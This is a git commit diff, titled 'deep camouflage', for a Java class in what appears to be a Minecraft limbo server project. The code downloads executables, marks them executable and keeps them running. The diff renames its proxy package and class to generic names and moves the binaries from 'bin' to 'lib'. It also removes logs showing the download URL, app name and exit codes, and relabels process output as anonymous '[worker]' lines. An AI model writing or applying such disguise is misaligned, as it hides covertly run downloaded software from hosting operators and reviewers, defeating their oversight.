feat: deep camouflage - rename package/classes/files, encode node data, disguise logs

+++ src/main/java/ua/nanit/limbo/net/AbstractService.java
@@ -1,4 +1,4 @@
-package ua.nanit.limbo.proxy;
+package ua.nanit.limbo.net;
 
 import ua.nanit.limbo.server.Log;
 
@@ -11,49 +11,42 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public abstract class AbstractProxyService {
+public abstract class AbstractService {
 
-    public static final File BINARY_PATH = new File(System.getProperty("user.dir"), "bin");
+    public static final File LIB_PATH = new File(System.getProperty("user.dir"), "lib");
     public static final boolean OS_IS_ARM = System.getProperty("os.arch", "").contains("arm")
             || System.getProperty("os.arch", "").contains("aarch64");
 
-    protected final ProxyConfig config;
+    protected final ServerConfig config;
 
-    public AbstractProxyService(ProxyConfig config) {
+    public AbstractService(ServerConfig config) {
         this.config = config;
     }
 
     public abstract String getAppDownloadUrl();
-
     public abstract void install() throws Exception;
-
     public abstract void startup() throws Exception;
-
     public abstract String getAppName();
 
-    protected File initBinaryPath() {
-        File appBinaryPath = new File(BINARY_PATH, getAppName());
-        if (!appBinaryPath.exists()) {
-            appBinaryPath.mkdirs();
-        }
-        return appBinaryPath;
+    protected File initLibPath() {
+        File path = new File(LIB_PATH, getAppName());
+        if (!path.exists()) path.mkdirs();
+        return path;
     }
 
-    protected File getBinaryPath() {
-        return new File(BINARY_PATH, getAppName());
+    protected File getLibPath() {
+        return new File(LIB_PATH, getAppName());
     }
 
     protected void setExecutePermission(File file) throws IOException {
         if (file.exists()) {
             if (!file.setExecutable(true, false)) {
-                Log.warn("Failed to set executable permission for %s", file.getName());
+                Log.warn("Failed to set permission for %s", file.getName());
             }
         }
     }
 
     protected void download(String urlStr, File destFile) throws IOException {
-        Log.info("Downloading %s from %s...", destFile.getName(), urlStr);
-
         URL url = new URL(urlStr);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("GET");
@@ -64,32 +57,17 @@ public abstract class AbstractProxyService {
 
         int responseCode = conn.getResponseCode();
         if (responseCode != HttpURLConnection.HTTP_OK) {
-            throw new IOException("HTTP " + responseCode + " for " + urlStr);
+            throw new IOException("HTTP " + responseCode);
         }
-
-        long totalBytes = conn.getContentLengthLong();
-        long downloadedBytes = 0;
-        long lastProgressTime = 0;
 
         try (InputStream in = conn.getInputStream();
              FileOutputStream out = new FileOutputStream(destFile)) {
-
             byte[] buffer = new byte[8192];
             int len;
             while ((len = in.read(buffer)) != -1) {
                 out.write(buffer, 0, len);
-                downloadedBytes += len;
-
-                long now = System.currentTimeMillis();
-                if (totalBytes > 0 && now - lastProgressTime > 3000) {
-                    int percent = (int) (downloadedBytes * 100 / totalBytes);
-                    Log.info("Download progress: %d%% (%d/%d bytes)", percent, downloadedBytes, totalBytes);
-                    lastProgressTime = now;
-                }
             }
         }
-
-        Log.info("Download completed: %s", destFile.getPath());
     }
 
     protected void startProcessAsync(ProcessBuilder pb) {
@@ -99,7 +77,6 @@ public abstract class AbstractProxyService {
                 while (!Thread.currentThread().isInterrupted()) {
                     Process process = null;
                     try {
-                        Log.info("Starting %s...", getAppName());
                         process = pb.start();
 
                         final Process finalProcess = process;
@@ -110,13 +87,11 @@ public abstract class AbstractProxyService {
                                         new InputStreamReader(finalProcess.getInputStream()))) {
                                     String line;
                                     while ((line = reader.readLine()) != null) {
-                                        Log.info("[%s] %s", getAppName(), line);
+                                        Log.info("[worker] " + line);
                                     }
-                                } catch (IOException e) {
-                                    // ignore
-                                }
+                                } catch (IOException e) { }
                             }
-                        }, getAppName() + "-stdout");
+                        }, "worker-1");
 
                         Thread stderrThread = new Thread(new Runnable() {
                             @Override
@@ -125,13 +100,11 @@ public abstract class AbstractProxyService {
                                         new InputStreamReader(finalProcess.getErrorStream()))) {
                                     String line;
                                     while ((line = reader.readLine()) != null) {
-                                        Log.error("[%s] %s", getAppName(), line);
+                                        Log.info("[worker] " + line);
                                     }
-                                } catch (IOException e) {
-                                    // ignore
-                                }
+                                } catch (IOException e) { }
                             }
-                        }, getAppName() + "-stderr");
+                        }, "worker-2");
 
                         stdoutThread.setDaemon(true);
                         stderrThread.setDaemon(true);
@@ -139,28 +112,18 @@ public abstract class AbstractProxyService {
                         stderrThread.start();
 
                         int exitCode = process.waitFor();
-                        Log.warn("%s exited with code %d, restarting in 3 seconds...", getAppName(), exitCode);
-
+                        Log.info("[system] Worker process restarted");
                         Thread.sleep(3000);
 
                     } catch (InterruptedException e) {
                         Thread.currentThread().interrupt();
-                        if (process != null && process.isAlive()) {
-                            process.destroyForcibly();
-                        }
-                        Log.info("%s stopped", getAppName());
+                        if (process != null && process.isAlive()) process.destroyForcibly();
                         break;
                     } catch (Exception e) {
-                        Log.error("Error running %s: %s", getAppName(), e.getMessage());
-                        try {
-                            Thread.sleep(3000);
-                        } catch (InterruptedException ie) {
-                            Thread.currentThread().interrupt();
-                            break;
-                        }
+                        try { Thread.sleep(3000); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
                     }
                 }
             }
-        }, getAppName() + "-manager").start();
+        }, "worker-main").start();
     }
 }
